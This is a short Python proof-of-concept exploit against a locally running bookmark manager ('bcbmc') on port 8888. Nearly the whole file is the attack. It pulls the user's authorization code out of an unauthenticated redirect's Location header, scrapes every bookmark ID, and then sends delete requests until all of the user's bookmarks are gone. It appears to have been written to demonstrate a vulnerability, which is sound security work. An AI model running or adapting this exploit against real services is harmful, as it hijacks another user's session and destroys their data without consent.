#the following exposes how an attacker is able to get the users auth code, the bmids and wiht this information delete all of the users precious bookmarks
import requests
import re
#code depends if user runs bcbmc but doesn't load the webbrowser, at runtime 
#attacker is able to get auth code and delete all bookmarks
url = "http://127.0.0.1:8888"

#attaker first gets authorization code
res = requests.get(url, allow_redirects=False)
#get location of url to help find authorization code
location = res.headers.get("Location","")
#print(f"this the locatuin?{location}")
found = re.search(r"/(\d+)/",location)
a_code = 0 
if found:
    a_code = found.group(1)
    print("users auth code",a_code)
else:
    print("no auth code found")
    exit()
#a_code = found.group(1)
#print("users auth code:",a_code)

#now that we know the auth code need to get bmid to delete bookmarks
res = requests.get(f"{url}/{a_code}/all/")
#print(res.text)
ids = re.findall("/static/(\\d+)", res.text)
#finds all bmids by chekcing the bookmark string
#print("FOUND BMIDS:", ids)

#command to delete all bookmarks in forloop 
for id in ids:
    response = requests.get(f"{url}/{a_code}/del/{id}")
    print("deleted bookmark") 
